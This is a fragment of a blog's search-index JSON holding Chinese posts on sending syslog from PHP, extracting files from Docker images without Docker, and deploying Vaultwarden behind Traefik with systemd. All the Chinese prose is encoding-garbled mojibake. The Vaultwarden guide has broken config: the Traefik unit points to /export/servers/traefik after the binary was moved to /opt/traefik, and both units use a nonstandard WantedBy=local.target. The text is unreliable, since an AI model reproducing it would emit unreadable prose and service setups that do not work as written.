çš„æ¶ˆæ¯ï¼Œé‚£ä¹ˆå°±æ˜¯ 20Ã—8+5=165 ï¼ŒåŒ…å¤´å°±æ˜¯ \u0026lt;165\u0026gt;\n","permalink":"https://rendoumi.com/posts/20211028-php_syslog/","summary":"\u003cp\u003eç»™åŒäº‹åšäº†ä¸ª PHP æ¥å£ï¼Œè½¬å‘å‘é€çŸ­ä¿¡çš„è¯·æ±‚ï¼ŒåŒæ—¶è¦æŠŠå‘é€è®°å½•å‘é€åˆ°è¿œç¨‹çš„ cacti çš„ syslog å»\u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿä¸ç®€å•\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯ PHP æœåŠ¡å™¨ï¼Œæ˜¯æœ€ç®€åŒ–ç¼–è¯‘çš„ï¼Œphp  -m æŸ¥äº†ä¸€ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ephp -m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[PHP Modules]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCore\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ectype\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecurl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efileinfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efilter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egettext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiconv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ejson\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibxml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epcre\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ePDO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epdo_sqlite\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ePhar\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eposix\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eReflection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esession\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSimpleXML\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSPL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esqlite3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estandard\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etokenizer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exmlreader\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exmlwriter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[Zend Modules]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå±…ç„¶æ²¡æœ‰ socket æ¨¡å—ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾åˆ°æºä»£ç ï¼Œç¼–è¯‘ä¸€ä¸ªå®‰è£…ï¼ŒåŸæœ‰çš„ php å®‰è£…è·¯å¾„æ˜¯ /export/servers/php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ tar zxvf php-7.4.0.tar.gz \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e php-7.4.0/sockets\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ /export/servers/php/bin/phpize\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./configure --enable-sockets --with-php-config\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/php/bin/php-config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ make install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåˆçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ php-fpmï¼Œå±…ç„¶æ²¡æœ‰ php.ini ï¼Œå¾—ï¼Œå†ç”Ÿæˆä¸€ä¸ªï¼Œæ”¾åœ¨ /export/servers/php/lib/php.ini\u003c/p\u003e","title":"PHPç¨‹åºå¦‚ä½•å‘é€syslogåˆ°è¿œç¨‹æœåŠ¡å™¨"},{"content":"ç”¨ kubernetes è¶Šå¤šï¼Œç”¨ docker è¶Šå¤šï¼Œå°±æ„ˆå‘æ„Ÿè§‰åˆ°å¥½å¤„å¤šå¤šã€‚\nç®€ç®€å•å•çš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨ docker åŸºæ¿ alphine å°è£…ï¼Œå°±å¯ä»¥è¿è¡Œèµ·ä¸€ä¸ª pod ï¼Œç„¶åæŒ‡å®š deploymentã€svcã€ingressï¼Œå°±å¯ä»¥å°†æœåŠ¡æš´éœ²å‡ºå»ã€‚\nå…¶å®å¾ˆå¤šæƒ…å†µä¸‹å•å¯æ‰§è¡Œæ–‡ä»¶ + systemdä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\nè¿™ä¸å°±é‡åˆ°ä¸ªé—®é¢˜ï¼Œghostunnel è¿™ä¸ªè½¯ä»¶ï¼Œgithub åªé‡Šæ”¾å‡ºäº†æºä»£ç ä»¥åŠ windows ã€linux å’Œ mac çš„ä¸‰ä¸ªå¯æ‰§è¡Œç‰ˆæœ¬ã€‚\nå¯æˆ‘çš„æ‰§è¡Œç¯å¢ƒæ˜¯ nanopi ï¼Œæ˜¯ä¸ª arm7 çš„æ¶æ„ï¼Œå°±æ— è®¡å¯æ–½äº†ã€‚\næ— å¥ˆä¸‹ï¼Œåœ¨ nanopi ä¸Šè£…äº† go ï¼Œç¼–è¯‘äº†ä¸ª arm7 çš„å‡ºæ¥ã€‚\nä½†æ˜¯é‡åˆ° vaultwanden ï¼Œrust çš„ï¼Œå°±æ²¡æ³•å¼„äº†ï¼Œvps å¤ªå¼±ï¼Œæ ¹æœ¬æ— æ³•ç”¨ cargo ç¼–è¯‘ã€‚\né‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼Œä¸å®‰è£… Docker ï¼Œä¹Ÿå¯ä»¥æŠŠé•œåƒä¸­çš„æ–‡ä»¶æŠ½å–å‡ºæ¥\n$ mkdir vm $ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract $ chmod +x docker-image-extract $ ./docker-image-extract vaultwarden/server:alpine Getting API token... Getting image manifest for vaultwarden/server:alpine... Fetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e... Fetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc... Fetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318... Fetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0... Fetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739... Fetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5... Fetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148... Image contents extracted into ./output. è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ output ç›®å½•ä¸‹å¾—åˆ° vaultwarden å’Œ web-vault\nå¦‚æœæˆ‘ä»¬è¦æ‹¿åˆ° arm7 çš„é•œåƒï¼Œè¿˜éœ€è¦å†è´¹ç‚¹åŠ²ï¼Œä»¥ ghostunnel ä¸ºä¾‹ï¼š\nè®¿é—®ï¼š https://hub.docker.com/r/ghostunnel/ghostunnel/tags\næ‰¾åˆ° linux/arm/v7 çš„ tagï¼Œ40247f4b49c3\nç‚¹å¼€åï¼Œæ‰¾åˆ° DIGEST: ï¼Œå¤åˆ¶sha256ä»¥åŠåé¢çš„å­—ä¸²ï¼Œsha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04\næŒ‰å¦‚ä¸‹æ–¹æ³•é‡Šæ”¾å³å¯ï¼š\n$ ./docker-image-extract ghostunnel/ghostunnel:sha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04 ä¸ç”¨æ‹…å¿ƒç›®å½•ç»“æ„ï¼Œé‡Šæ”¾å‡ºæ¥çš„æ–‡ä»¶ä¼šæ”¾åˆ°å½“å‰ output ç›®å½•ä¸‹ã€‚\n","permalink":"https://rendoumi.com/posts/20211027-docker_extract_file/","summary":"\u003cp\u003eç”¨ kubernetes è¶Šå¤šï¼Œç”¨ docker è¶Šå¤šï¼Œå°±æ„ˆå‘æ„Ÿè§‰åˆ°å¥½å¤„å¤šå¤šã€‚\u003c/p\u003e\n\u003cp\u003eç®€ç®€å•å•çš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨ docker åŸºæ¿ alphine å°è£…ï¼Œå°±å¯ä»¥è¿è¡Œèµ·ä¸€ä¸ª pod ï¼Œç„¶åæŒ‡å®š deploymentã€svcã€ingressï¼Œå°±å¯ä»¥å°†æœåŠ¡æš´éœ²å‡ºå»ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®å¾ˆå¤šæƒ…å†µä¸‹å•å¯æ‰§è¡Œæ–‡ä»¶ + systemdä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸å°±é‡åˆ°ä¸ªé—®é¢˜ï¼Œghostunnel è¿™ä¸ªè½¯ä»¶ï¼Œgithub åªé‡Šæ”¾å‡ºäº†æºä»£ç ä»¥åŠ windows ã€linux å’Œ mac çš„ä¸‰ä¸ªå¯æ‰§è¡Œç‰ˆæœ¬ã€‚\u003c/p\u003e\n\u003cp\u003eå¯æˆ‘çš„æ‰§è¡Œç¯å¢ƒæ˜¯ nanopi ï¼Œæ˜¯ä¸ª arm7 çš„æ¶æ„ï¼Œå°±æ— è®¡å¯æ–½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ— å¥ˆä¸‹ï¼Œåœ¨ nanopi ä¸Šè£…äº† go ï¼Œç¼–è¯‘äº†ä¸ª arm7 çš„å‡ºæ¥ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯é‡åˆ° vaultwanden ï¼Œrust çš„ï¼Œå°±æ²¡æ³•å¼„äº†ï¼Œvps å¤ªå¼±ï¼Œæ ¹æœ¬æ— æ³•ç”¨ cargo ç¼–è¯‘ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼Œä¸å®‰è£… Docker ï¼Œä¹Ÿå¯ä»¥æŠŠé•œåƒä¸­çš„æ–‡ä»¶æŠ½å–å‡ºæ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ mkdir vm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ chmod +x docker-image-extract\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ./docker-image-extract vaultwarden/server:alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetting API token...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGetting image manifest \u003cspan class=\"k\"\u003efor\u003c/span\u003e vaultwarden/server:alpine...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eImage contents extracted into ./output.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ output ç›®å½•ä¸‹å¾—åˆ° vaultwarden å’Œ web-vault\u003c/p\u003e","title":"æ²¡æœ‰è£…Dockerå¦‚ä½•ä»é•œåƒä¸­é‡Šæ”¾å‡ºæ–‡ä»¶"},{"content":"ä¸ºä»€ä¹ˆä¼šæœ‰é Docker ç¯å¢ƒè¿™ä¸ªæ€ªå­—çœ¼å‘¢ï¼Ÿ\næ— ä»–ï¼Œå› ä¸ºæ»¡ç½‘æœç´¢åˆ°çš„æ•™ç¨‹éƒ½æ˜¯åœ¨ Docker ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ã€‚\nä½†æ˜¯ç©·å•Šï¼Œå…«æˆ’çš„ vps æ˜¯ä¸ªå•æ ¸ 500m çš„ justhost æœºå™¨ï¼Œä¾¿å®œçš„å¾ˆï¼Œè¿™ç§å»‰ä»·æœºå™¨æ¥è·‘ Dockerï¼ŒåŸºæœ¬è¦å 100Mï¼Œè·‘ä¸å¤ªåŠ¨ã€‚\nè¿™ç§ä¸€ç©·äºŒç™½çš„ç¯å¢ƒï¼Œå°±åªèƒ½æŠŠ Bitwarden ä»å®¹å™¨é‡Œæ‹†å‡ºæ¥ç”¨ã€‚\nå¥½åœ¨ Bitwarden_rs æ˜¯ä¸€ä¸ª rust ç¨‹åºï¼Œå å†…å­˜(16Må·¦å³)å’Œcpuæå°‘ï¼Œæœ¬èº«å°±é€‚åˆåœ¨ systemd ç¯å¢ƒä¸‹è·‘ã€‚\nè¿™é‡Œå°±åˆ©ç”¨ vaultwarden å’Œ traefikï¼Œåœ¨ä¸€å°è€ç ´å°æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚\nç³»ç»Ÿç¯å¢ƒæ˜¯ CentOS 7.9\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½bitwarden(vaultwarden) wget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz äºŒã€å®‰è£…cargoå¹¶ç¼–è¯‘ï¼ˆå¯é€‰ï¼‰ yum install -y epel-release yum install -y openssl-devel cargo cd vaultwarden-1.23.0 cargo build --release --features sqlite ç›´æ¥çˆ†é”™å•Šï¼Œå°å°çš„ vps è¿ç¼–è¯‘éƒ½è¿‡ä¸å»ï¼Œç¼–è¯‘è¿›ç¨‹éƒ½è¢« kill æ‰äº†\nä¸‰ã€ä¸‹è½½vaultwardenä¸»æ–‡ä»¶ ç¼–è¯‘ä¸é€šï¼Œå°±åªèƒ½æƒ³åˆ«çš„åŠæ³•äº†ã€‚Faint\næ‰¾ä¸€å°æœ‰ docker æœºå™¨ï¼Œä»é‡Œé¢æŠŠæ–‡ä»¶éƒ½è§£æå‡ºæ¥å¥½äº†\ndocker pull vaultwarden/server:alpine docker create --name vw vaultwarden/server:alpine docker cp vw:/vaultwarden . docker cp vw:/web-vault . docker rm vw è¿™æ ·ä¼šå¾—åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ vaultwarden å’Œä¸€ä¸ªç›®å½• web-vault\næˆ‘ä»¬æŠŠè¿™ä¸¤ä¸ªä¸œè¥¿éƒ½æŒªåˆ° /opt/vaultwarden ç›®å½•ä¸‹ï¼Œå¹¶ä¸”å»ºç«‹ data æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾è¦ç”Ÿæˆçš„ sqlite3 æ•°æ®æ–‡ä»¶ã€‚\nmkdir -p /opt/vaultwarden/data mv vaultwarden /opt/vaultwarden mv web-vault /opt/vaultwarden å››ã€ç”Ÿæˆsystemdå¯åŠ¨æ–‡ä»¶ æ³¨æ„ï¼Œä¸‹é¢æˆ‘ä»¬è®¾ç½®äº† vaultwarden ROCKET_ADDRESS çš„ç›‘å¬åœ°å€æ˜¯ 127.0.0.1 ï¼Œä¸€æ˜¯ä¸ºäº†å®‰å…¨ï¼ŒäºŒæ˜¯ä¸ºäº†ä¸‹ä¸€æ­¥æˆ‘ä»¬æ­å»º traefikï¼Œæ¥åä»£ vaultwarden ç”¨çš„ï¼›å› ä¸ºè®¿é—® vaultwarden å¿…é¡»è¦åŠ è¯ä¹¦ï¼Œè€Œå®ƒæœ¬èº«æ˜¯æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½çš„ï¼Œå¿…é¡»å‰ç½®ä¸€ä¸ª nginx æˆ–è€… haproxy æˆ–è€… traefik æˆ–è€… carddyã€‚\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/vaultwarden.service [Unit] Description=Bitwarden [Service] Type=simple Restart=always Environment=\u0026#34;ROCKET_ADDRESS=127.0.0.1\u0026#34; WorkingDirectory=/opt/vaultwarden ExecStart=/opt/vaultwarden/vaultwarden [Install] WantedBy=local.target EOF äº”ã€é…ç½®traefik wget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz tar zxvf traefik_v2.4.8_linux_amd64.tar.gz mkdir -p /opt/traefik/dynamic mv traefik /opt/traefik ç”Ÿæˆtraefiké…ç½®æ–‡ä»¶ï¼Œåˆ©ç”¨ traefik è‡ªåŠ¨ç”³è¯· Let\u0026rsquo;s encrypt è¯ä¹¦\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/traefik.yml log: level: DEBUG api: insecure: false dashboard: true entryPoints: http: address: \u0026#34;:80\u0026#34; http: redirections: entryPoint: to: https scheme: https https: address: \u0026#34;:443\u0026#34; certificatesResolvers: letsEncrypt: acme: storage: /opt/traefik/acme.json email: zhangranrui@gmail.com tlsChallenge: {} httpChallenge: entryPoint: http providers: file: directory: /opt/traefik/dynamic watch: true é…ç½® vaultwarden ä»£ç†\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/dynamic/pass.yml http: routers: https_01: rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; service: svc_01 tls: certresolver: letsEncrypt http_01: rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; service: svc_01 entryPoints: - http services: svc_01: loadBalancer: servers: - url: \u0026#34;http://localhost:8000\u0026#34; EOF è®¾ç½® traefik çš„ systemd å¯åŠ¨æ–‡ä»¶\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/traefik.service [Unit] Description=traefik [Service] Type=simple Restart=always WorkingDirectory=/export/servers/traefik ExecStart=/export/servers/traefik/traefik [Install] WantedBy=local.target EOF äº”ã€å¯åŠ¨vaultwardenå’Œtraefik systemctl daemon-reload systemctl enable --now vaultwarden systemctl enable --now traefik æ‰“å¼€é¡µé¢ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„ç”¨ä¸€å°è€ç ´å°æ­å»ºäº†è‡ªå·±çš„å¯†ç ç®¡ç†æœåŠ¡å™¨ï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20211027-bitwarden/","summary":"\u003cp\u003eä¸ºä»€ä¹ˆä¼šæœ‰é Docker ç¯å¢ƒè¿™ä¸ªæ€ªå­—çœ¼å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæ— ä»–ï¼Œå› ä¸ºæ»¡ç½‘æœç´¢åˆ°çš„æ•™ç¨‹éƒ½æ˜¯åœ¨ Docker ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ç©·å•Šï¼Œå…«æˆ’çš„ vps æ˜¯ä¸ªå•æ ¸ 500m çš„ justhost æœºå™¨ï¼Œä¾¿å®œçš„å¾ˆï¼Œè¿™ç§å»‰ä»·æœºå™¨æ¥è·‘ Dockerï¼ŒåŸºæœ¬è¦å 100Mï¼Œè·‘ä¸å¤ªåŠ¨ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç§ä¸€ç©·äºŒç™½çš„ç¯å¢ƒï¼Œå°±åªèƒ½æŠŠ Bitwarden ä»å®¹å™¨é‡Œæ‹†å‡ºæ¥ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eå¥½åœ¨ Bitwarden_rs æ˜¯ä¸€ä¸ª rust ç¨‹åºï¼Œå å†…å­˜(16Må·¦å³)å’Œcpuæå°‘ï¼Œæœ¬èº«å°±é€‚åˆåœ¨ systemd ç¯å¢ƒä¸‹è·‘ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œå°±åˆ©ç”¨ vaultwarden å’Œ traefikï¼Œåœ¨ä¸€å°è€ç ´å°æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eç³»ç»Ÿç¯å¢ƒæ˜¯ CentOS 7.9\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½bitwardenvaultwarden\"\u003eä¸€ã€ä¸‹è½½bitwarden(vaultwarden)\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒå®‰è£…cargoå¹¶ç¼–è¯‘å¯é€‰\"\u003eäºŒã€å®‰è£…cargoå¹¶ç¼–è¯‘ï¼ˆå¯é€‰ï¼‰\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y openssl-devel cargo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e vaultwarden-1.23.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecargo build --release --features sqlite\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç›´æ¥çˆ†é”™å•Šï¼Œå°å°çš„ vps è¿ç¼–è¯‘éƒ½è¿‡ä¸å»ï¼Œç¼–è¯‘è¿›ç¨‹éƒ½è¢« kill æ‰äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211027144917206\" loading=\"lazy\" src=\"/posts/20211027-bitwarden/image-20211027144917206.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ä¸‹è½½vaultwardenä¸»æ–‡ä»¶\"\u003eä¸‰ã€ä¸‹è½½vaultwardenä¸»æ–‡ä»¶\u003c/h2\u003e\n\u003cp\u003eç¼–è¯‘ä¸é€šï¼Œå°±åªèƒ½æƒ³åˆ«çš„åŠæ³•äº†ã€‚Faint\u003c/p\u003e\n\u003cp\u003eæ‰¾ä¸€å°æœ‰ docker æœºå™¨ï¼Œä»é‡Œé¢æŠŠæ–‡ä»¶éƒ½è§£æå‡ºæ¥å¥½äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre 